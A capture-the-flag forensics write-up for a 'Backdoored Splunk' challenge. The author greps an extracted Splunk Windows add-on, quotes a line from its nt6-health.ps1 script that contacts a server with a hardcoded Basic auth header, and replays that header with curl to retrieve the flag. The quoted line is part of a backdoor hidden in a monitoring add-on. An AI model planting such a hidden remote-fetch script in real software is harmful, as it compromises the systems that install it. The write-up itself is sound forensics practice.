---
title: "Backdoored Splunk"
date: 2023-10-07T13:08:05-10:01
#draft: true
tags: ['CTF','Writeups', 'Forensics', 'Medium']
---
 
# [Home](https://jjolley91.github.io/blog/) >

###  [Huntress CTF](https://jjolley91.github.io/blog/huntress_ctf_2023) >  [Medium Challenges](https://jjolley91.github.io/blog/huntress_ctf_2023/2.Medium/)

## [Back](https://jjolley91.github.io/blog/huntress_ctf_2023/traffic)  <> [Next](https://jjolley91.github.io/blog/huntress_ctf_2023/2.Medium/where_am_i) 

### You've probably seen Splunk being used for good, but have you seen it used for evil?

We were given a 'Splunk_TA_windows.zip' file to download.Once the contents were extracted we are given several directories and files to inspect.

Furthermore, by curling the provided url we get the following response: 
```bash
curl http://chal.ctf.games:30644/                                                                                                                  
{"error":"Missing or invalid Authorization header"}
```
It seems as though we are missing an Authorization header in the request. We can then see if there is one present in the extracted files using:
```bash
grep -ri Authorization 
```
We get a hit in the results that looks promising: 
![splunk2](https://github.com/jjolley91/blog/blob/main/static/Huntress_CTF_2023/backdoored_splunk.png?raw=true)


```bash
bin/powershell/nt6-health.ps1:$OS = @($html = (Invoke-WebRequest http://chal.ctf.games:$PORT -Headers @{Authorization=("Basic YmFja2Rvb3I6dXNlX3RoaXNfdG9fYXV0aGVudGljYXRlX3dpdGhfdGhlX2RlcGxveWVkX2h0dHBfc2VydmVyCg==")} -UseBasicParsing).Content
```
We decided to try to curl the url and included the paramater like so:
```	bash					

curl http://chal.ctf.games:30644/ -H Authorization:"Basic YmFja2Rvb3I6dXNlX3RoaXNfdG9fYXV0aGVudGljYXRlX3dpdGhfdGhlX2RlcGxveWVkX2h0dHBfc2VydmVyCg=="
```
We were given a response this time with a base64 encoded message. We were able to decode the response and submit the flag!
![splunk](https://github.com/jjolley91/blog/blob/main/static/Huntress_CTF_2023/backdoored_splunk.png?raw=true)

## [Back](https://jjolley91.github.io/blog/huntress_ctf_2023/traffic)  <> [Next](https://jjolley91.github.io/blog/huntress_ctf_2023/2.Medium/where_am_i) 

